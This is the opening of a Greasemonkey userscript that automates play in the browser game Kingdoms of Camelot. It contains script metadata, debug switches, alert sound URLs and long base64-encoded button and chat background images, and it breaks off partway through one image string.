// ==UserScript==
// @name           Zakra Robot Alliance
// @version        1
// @namespace      NocX
// @homepage       http://userscripts.org/scripts/show/158505
// @include        *.kingdomsofcamelot.com/*main_src.php*
// @include        *.kingdomsofcamelot.com/*platforms/kabam*
// @include        *apps.facebook.com/kingdomsofcamelot/*
// @include        *kabam.com/games/kingdoms-of-camelot/play*
// @include        *facebook.com/dialog/feed*

// @grant       GM_getValue
// @grant       unsafeWindow
// @grant       GM_deleteValue
// @grant       GM_getValue
// @grant       GM_setValue
// @grant       GM_listValues
// @grant       GM_addStyle
// @grant       GM_xmlhttpRequest
// @grant       GM_log
// @grant       GM_registerMenuCommand

// @description    Automated features for Kingdoms of Camelot
// ==/UserScript==

//Fixed weird bug with koc game
if(window.self.location != window.top.location){
	try{
		if(window.self.location.href == window.parent.location.href){
			return; //If iframe source is same as the parent don't load script
		}
	} catch (e){
		//logit(inspect(e,2,1));
	}
}

var Version = '1';


//bandaid to stop loading in advertisements containing the @include urls
if(document.URL.indexOf('sharethis') != -1) {
	GM_log('sharethis:'+document.URL);
	return;

};
// These switches are for testing, all should be set to false for released version:
var DEBUG_TRACE = false;
var DEBUG_SEARCH = false;
var ENABLE_TEST_TAB = false;
var ENABLE_ATTACK_TAB = false;
var ENABLE_SAMPLE_TAB = false;
var DISABLE_BULKADD_LIST = false;
var ENABLE_GM_AJAX_TRACE = false;
var SEND_ALERT_AS_WHISPER = false;
// end test switches

var MAP_DELAY = 4000;

var DEFAULT_ALERT_SOUND_URL = 'http://koc-power-bot.googlecode.com/svn/trunk/RedAlert.mp3';
var SWF_PLAYER_URL = 'http://koc-power-bot.googlecode.com/svn/trunk/alarmplayer.swf';

var URL_CASTLE_BUT = "data:image/png;base64,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";
var URL_CASTLE_BUT_SEL = "data:image/png;base64,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";
var CHAT_BG_IMAGE = "data:image/gif;base64,R0lGODlhagHQAvcAAP%2F%2F5v%2F%2F1v%2F33v%2F31vf35v%2F3zvf33v%2F3xff31vf3zv%2Fv3u%2F33v%2Fv1v%2Fvzvfv1vfvzvfvxffvvffmzu%2Fmvebmvffere%2Feve%2Fete%2Fere%2Fepebevebeteberd7evd7ete%2FWpebWtd7Wtd7Wrd7WpdbWrd7Ord7OpdbOrdbOpdbFpc7FtdbFnM7FnMXFrc7FlM69rc69nM69lM69jMW9nMW9lMW9jL29nL29lM61jMW1nMW1lMW1jL21nMW1hL21lL21jMWtlLW1lL2tnL2tlL2thL2te7WthL2le72lc7WlhL2la7Wle7Wlc7Wla62le62lc7Wce7Wcc62chLWca6WcjK2cc6WchK2ca62cY6Wcc6Wca6WUhK2Ua6WUa6WUY5yUY5yMa5yMY5yMWpSMa5SMY5SMWoyMY5SEa5SEY4SEe4yEY4yEWoyEUpx7Uox7Wox7UoR7WoR7UoRzUntzY4RzSntzUntzSnNzSntrSmtrY3NrSmtjOhlrzmNaSjpjhBljxRljvRljtRlarRlapRlSnBlSlBlKjBlKhBlKexlCexlCcxlCa0o6CCE6Uhk6Yxk6WkopAEIpADopABAxQjEpEDEpCCEpMRkpMTohADEhACkhCDEZACkZACEZCCEZACEQABkQABkIABAIABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAAAagHQAgAI%2FgB1NGgAB02XJUaWKFziZEmShRAVOplIcSIUKA4fLsG4EUqVj1kqNpQosmJEJ1VGSvx4saXLlwxLTvxYReFHmSgnkqRJkabPn0CrvGypE2fFlEZLCl3I8SJEKCirZJmKNGlJIxRJjoza0CREq0eVBq0KNqdIpFo7ehQ61OVYLTSnZoGbUUoSJ0yeNJlR4EGdOGsCC37jRvAaN4gDI37DuDHjOI3dOHYcR46cyZgzI94cmfMby6BBZ34Tp7Tp0ocZFx79GPNp03LsjLZcGjRk1ZJZE278%2Bvbj3qZVH0482rQdO8DjbEZ8OnHwNaU9q9ZNOvnpzryTvzEcuLRr4MWt%2Fgev%2FpoOHdPm0zOWszkOm%2Fc3HjxY42QGChQmRNw%2FQaL%2FiRP7%2FYeCCAT%2BR6B%2B9yUYoIAKmuCgCSVEWMKDD5aAH4UOXkghCvz15yEJCoYoIgoT3gehCSRieKKEEkIogoQj3pcChx7%2Bx99%2FH%2F7H4o4RoohCCjNyaOOCAIb4YX8xJriCggDqGGGRIloo4oYaVgjjiBnGmGWSCdqIoopbhljhg1yWaeYKQJZwwoEjjHBDAgmoYcQGfRVg550DFJCnnQP0ead88tkJ56AJCEoonAUMpOiddiraAKOQRsrooZQOmqiji17qqKaLYurpp54WUGilk3IKaqiMNuAnpIiuKiqi%2F68W2uhAktYKKa13nqorpolemmukj9p6a6278kqqsH8%2B8CcEyhZwwAGMPgCBnQI1sIYRIDQAQbGbcmqqow%2BAGm64npKL6bjncituA%2BiiO1C77MYL77i5BtuXueqCqum37ALq77%2F%2B5vvuv%2F0GPLDBBhfbLr6KAkxwwacCKnC6706M67f1OhtBBBAcwOwADjgwA7tygJGEDjrkoPLKKvuwsg8w5wCzD0MMMXMOKKO8MhApsywzD0AHLfTQQc88NMxBDwHE0kwD4fPLM0dtdNRAU0200DPXXDPNWnettNc8s8yz1DPPYHYOVZNt9NE%2B6KB0z27rvDLKRa9dddBo86C21f5D5%2B3D1XjnMMPKgO8NeN12H6643joA0TXPTXstueQ%2FDPFDD5gXofkPlQuRgwQSwOGGGmecAcbpqIOxhRVWSCEF663DLrsVW9Re%2B%2By45667FVTsrvvrwPsu%2FPC2F7867Lfvfjztt9vOfPLD0%2F588dFXb73yy%2Bee%2FfXcd8%2B98eCHD%2F4ZcMxRRx1zwHHGEkQwQQcj8O%2FRRx8vMOBAHX2Iov%2F%2B%2FPfv%2F%2F8ADKAAB0jAAhrwgAhMoAIXyMAGOvCBEIygAxmhhyUUgQ3wy%2BALDKCAOeRPgiAMoQhHSMISmvCEKEzh%2Fxixhh6IIYOMaIEBDOBBFdrwhjjMoQ53yEMJsrAK7%2F6DXwsIQIAa9vCISEyiEpfIRAMyogtV2AP8XkBEIzbxiljMoha3%2BMA9ZGENU1RABz%2FIxTKa8YxoZCIZjBDGMYLijXCMoxznSMc62vGOeMyjHvfIxz768Y%2BADKQgB0nIQhrykG%2FcQxQZ8QIxehCRkIykJCdJyUpa8pKYzCQoGMGFNjByho%2FUpChHScpSmvKUqBRkF7gQQ0f2IZWwjKUsZ0nLWuIxCzuIIQdDacte%2BvKXwAwmIHGpSzcK85jITKYyY0nMFrhymdCMpjSnWchmPpOa2MymNrNpTWNu85vgDGcvs9CDVnpTnOhMpzozmQUimNODnYinPOdJz3ra8574zP%2BnPvfJz376858ADahAB0rQghr0oAhNqDzJ%2Bc4%2BKPShEI2oRCdK0Ypa9KIYjWc34ZnRjnr0oyANqUhHStCNOpSkKE2pSlfK0pbmk6HOHKNLZ0rTmtr0piUtZyNlitOe%2BvSnQE0pQ3fK0aAa9ahITWpBh%2BpKpTr1qVCFKlN5GtWqWvWqM4UpKE%2BK1a569asZbacuachVsJr1rGgtqTtlSFZNuPWtcI2rXOdK17ra9a54zate98rXvvr1r4ANrGAHS9jCGvatYmWrBw%2FL2MY69rGQjaxkJ0vZyro1C0Uo5mIty9nOevazoA2taAOLWc32YbSoTa1qV8va1t61CkdoqGv%2BZ0vb2tr2toGFrWxxy9ve%2Bva3qdUtUU8L3OIa97jIHaxwXZnc5jr3uc9d7hihS93qWre20t3sdbfL3e5aVrcx9SAlxkve8pr3vOhNr3rXy972uve98I2vfOdL3%2Fra9774za9%2B90veKhQBEuHVA38HTOACG%2FjACE6wghfM4PFC4QgAdqSAG0zhClv4whjOsIbt%2B%2BAIj3HDIA6xiEdM4hKztwpIgIQKXNmISbj4xTCOsYxnTOMa2%2FjGOM6xjnfM4x77%2BMdADrKQh0zkIhf5EpagxBVSTNQ88OHJUI6ylKdM5Spb%2BcpYzrKWt8zlLnv5y2AOs5jHTOYym%2FnMUH5Cilv%2BsIAF5CEPf4iznOdM5zrb%2Bc54zrOe98znPvv5z4AOtKAHTehCG%2FrQiE60nO0CCRsgwM1%2BAISkJ03pSlv60pjOtKY3zelOe%2FrToA61qEdN6lKb%2BtSoTrWqJ22FJEBiBgPoYKRXTeta2%2FrWuM61rnfN614DwgpLgAQMBCDrQBj72MhOtrKXzexmO%2FvZ0I62tKdN7Wpb%2B9rYzra2t83tbnv72A2BxE7T4AdBmPvc6E63utfN7na7%2B93wjre8503vetv73vjOt773ze9%2B%2B%2FvcRoiCh8n974Ib%2FOAIT7jCF87whjvc3EaA8LjzMIiKW%2FziGM%2B4xjfO8Y57%2FOMgD7nIR07%2F8pKb%2FOQoT7nKV87ylls8CRIXYxryQIia2%2FzmOM%2B5znfO8577%2FOdAD7rQh070ohv96EhPutKXzvSm2zzi4pY5zZ1O9apb%2FepYz7rWt871rhPCCEyWeiHGTvaym%2F3saE%2B72tfO9ra7%2Fe1wj7vc5073utv97njPu973TnawR10BMzeE4AdP%2BMIb%2FvCIT7ziF8%2F4xjv%2B8ZCPvOQnT%2FnKW%2F7ymM%2B85gcP9Q12MA%2BbD73oR0%2F60pv%2B9KhPveoFnxAAgzIPh4i97GdP%2B9rb%2Fva4z73ud8%2F73vv%2B98APvvCHT%2FziG%2F%2F4yE%2B%2B7I3ABNfTMA%2BIiL70p0%2F96lv%2F%2BtjPvva3z%2F3u%2Fnv%2F%2B%2BAPv%2FjHT%2F7ym%2F%2F86E%2B%2F9Jn%2F9znkIRHwj7%2F850%2F%2F%2Btv%2F%2FvjPv%2F73z%2F%2F%2B%2B%2F%2F%2FABiAAjiABFiABniACBh%2FftdICOB%2BivCAEBiBEjiBFFiBFniBGJiBGriBHNiBHviBIBiCIjiCJFiCJniCEAhzABYy7rcILviCMBiDMjiDNFiDNniDOJiDOriDPNiDPviDQBiEQjiERFiERviCKtgCDtCAeXCETviEUBiFUjiFVFiFVniFLpgEUKBibeZ%2BjvCFYBiGYjiGZFiGZniGaJiGariGbNiGbviGcBiHcjiHdFiHdniHYPgDUBAJKvB6j%2FCHgBiIgjiIhFiIhniIiJiI%2F4q4iIzYiI74iJAYiZI4iZRYiZZ4iYAoBcHGAyEDB1SgAgAQiqI4iqRYi